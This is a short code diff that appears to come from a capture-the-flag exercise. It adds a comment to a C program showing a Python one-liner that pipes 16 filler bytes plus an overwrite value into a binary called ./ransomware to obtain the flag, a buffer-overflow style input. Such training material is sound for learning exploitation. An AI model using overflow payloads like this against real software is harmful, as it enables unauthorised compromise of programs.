@@ -54,3 +54,5 @@ int main() {
 
     return 0;
 }
+
+// example output to produce the flag: python3 -c "print('A'*16 + '\x01\x00\x00\x00')" | ./ransomware 
